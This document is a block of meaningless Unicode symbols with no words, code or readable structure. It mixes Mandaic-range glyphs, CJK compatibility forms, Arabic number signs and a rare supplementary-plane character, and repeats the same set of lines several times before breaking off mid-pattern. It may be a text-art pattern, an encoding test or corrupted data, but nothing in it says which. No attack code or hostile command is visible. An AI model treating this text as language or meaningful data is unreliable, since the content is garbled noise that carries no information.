࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬